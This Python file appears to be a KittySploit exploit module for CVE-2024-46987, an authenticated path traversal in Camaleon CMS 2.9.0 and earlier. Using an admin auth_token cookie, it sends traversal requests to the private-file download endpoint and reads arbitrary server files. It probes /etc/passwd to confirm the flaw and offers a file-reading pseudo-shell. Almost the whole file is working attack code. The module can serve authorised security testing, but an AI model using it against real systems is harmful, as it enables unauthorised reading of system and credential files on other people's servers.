#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from kittysploit import *
from lib.protocols.http.camaleon_cve_2024_46987 import (
    auth_token_cookie_dict,
    camaleon_download_private_path,
    normalize_camaleon_base_path,
    response_body_suggests_passwd_read,
    response_is_admin_login_redirect,
    response_ok_for_traversal_probe,
    traversal_param_for_unix_path,
)
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.lfi import Lfi


class Module(Auxiliary, Http_client, Lfi):

    __info__ = {
        "name": "Camaleon CMS authenticated path traversal (CVE-2024-46987)",
        "description": (
            "Camaleon CMS ≤ 2.9.0 allows authenticated administrators to read arbitrary local files "
            "via GET /admin/media/download_private_file with a path traversal in the file parameter "
            "and a valid auth_token cookie. Uses lib.protocols.http.lfi (execute hook + optional shell)."
        ),
        "author": ["KittySploit Team"],
        "cve": ["CVE-2024-46987"],
        "references": [
            "https://github.com/owen2345/camaleon-cms",
            "https://github.com/owen2345/camaleon-cms/releases/tag/2.9.0",
        ],
        "tags": ["camaleon", "rails", "path-traversal", "lfi", "cve-2024-46987"],
    }

    base_path = OptString("/", "Camaleon base URL path (e.g. / if at site root)", required=False)
    auth_token = OptString("", "auth_token cookie value (admin session)", required=True)
    depth = OptInteger(7, "Number of '../' segments to prepend (PoC default: 7)", required=False, advanced=True)
    output_limit = OptInteger(3000, "Max characters of body to print when not using shell (0 = full)", required=False, advanced=True)

    def _prefix(self) -> str:
        return normalize_camaleon_base_path(self.base_path)

    def _traversal_path(self, file_param: str) -> str:
        return camaleon_download_private_path(self.base_path, file_param)

    def _cookies(self) -> dict:
        return auth_token_cookie_dict(self.auth_token)

    def execute(self, file_path: str) -> str:
        """Lfi mixin hook: read ``file_path`` on the server via path traversal."""
        p = (file_path or "").strip()
        if not p:
            return ""

        if not self._cookies():
            print_error("auth_token is required for LFI read")
            return ""

        depth = max(1, int(self.depth or 7))
        file_param = traversal_param_for_unix_path(depth, p)

        try:
            resp = self.http_request(
                method="GET",
                path=self._traversal_path(file_param),
                cookies=self._cookies(),
                allow_redirects=False,
                timeout=max(int(self.timeout or 10), 10),
            )
        except Exception as e:
            print_error(f"HTTP error: {e}")
            return ""

        if response_is_admin_login_redirect(resp):
            print_error("auth_token appears invalid or expired (redirect to /admin/login)")
            return ""

        if resp and resp.status_code == 302:
            loc = resp.headers.get("Location", "")
            print_warning(f"Unexpected HTTP 302 → {loc or '(no Location)'}")
            return ""

        if resp and resp.status_code == 200:
            return resp.text or ""

        if resp and resp.status_code == 500:
            print_error("HTTP 500 — path may be invalid or server error")
        elif resp:
            print_error(f"Unexpected HTTP {resp.status_code}")
        return ""

    def check(self):
        try:
            home = self.http_request(method="GET", path=f"{self._prefix()}/" or "/", allow_redirects=True)
            if home and home.status_code == 200:
                body = (home.text or "").lower()
                if "camaleon" in body or "camaleon_cms" in body:
                    hint = "Camaleon-like content detected"
                    if str(self.auth_token or "").strip():
                        out = self.execute("/etc/passwd")
                        if out and response_body_suggests_passwd_read(out):
                            return {
                                "vulnerable": True,
                                "reason": f"{hint}; traversal read of /etc/passwd succeeded",
                                "confidence": "high",
                            }
                    return {
                        "vulnerable": True,
                        "reason": f"{hint}; provide auth_token to confirm CVE-2024-46987",
                        "confidence": "low",
                    }
            if str(self.auth_token or "").strip():
                out = self.execute("/etc/passwd")
                if out and response_body_suggests_passwd_read(out):
                    return {
                        "vulnerable": True,
                        "reason": "Traversal read of /etc/passwd succeeded (CVE-2024-46987)",
                        "confidence": "high",
                    }
            return {
                "vulnerable": False,
                "reason": "Camaleon fingerprint not found and traversal probe inconclusive",
                "confidence": "low",
            }
        except Exception as e:
            return {"vulnerable": False, "reason": f"Check failed: {e}", "confidence": "low"}

    def run(self):
        if not str(self.auth_token or "").strip():
            print_error("auth_token is required")
            return False

        if self.shell_lfi:
            print_status("LFI pseudo-shell (paths are read via Camaleon traversal)")
            self.handler_lfi()
            return True

        out = self.execute(str(self.file_read))
        if not out:
            return False

        lim = int(self.output_limit or 3000)
        if lim and len(out) > lim:
            print_info(out[:lim] + "\n... [truncated]")
        else:
            print_success("Response body:")
            print_info(out)
        return True
